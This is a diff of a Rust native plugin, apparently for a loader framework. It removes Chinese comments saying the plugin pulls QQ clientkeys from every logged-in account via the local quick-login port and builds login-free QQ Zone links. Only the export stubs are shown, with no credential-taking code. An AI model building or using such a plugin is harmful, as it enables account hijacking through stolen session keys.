@@ -1,22 +1,15 @@
-//! QQ clientkey 插件 — 独立 native 插件（cdylib）。
 //!
-//! 完全对齐 qq_ck_test.py 脚本方法：本地快速登录端口取全部已登录 QQ，
-//! 每个 uin 取 clientkey，并生成 QQ 空间免登链接（ptsigx）。不做内存扫描/skey/bkn。
 //!
-//! ABI（libra-load）：
 //!   module_name() -> *const u8
 //!   module_main(input, input_len, output, output_cap) -> usize
 
 mod qq_clientkey;
 
-/// 自识别名（必须与插件 meta.json 的 module.name 一致）。
 #[no_mangle]
 pub extern "C" fn module_name() -> *const u8 {
     concat!("qqkey", "\0").as_ptr() as *const u8
 }
 
-/// 入口：input 为 JSON，op=="list" 时只列账号（uin+nickname，不取 clientkey），
-/// 否则执行完整采集（clientkey + ptsigx）。
 #[no_mangle]
 pub unsafe extern "system" fn module_main(
     input: *const u8,
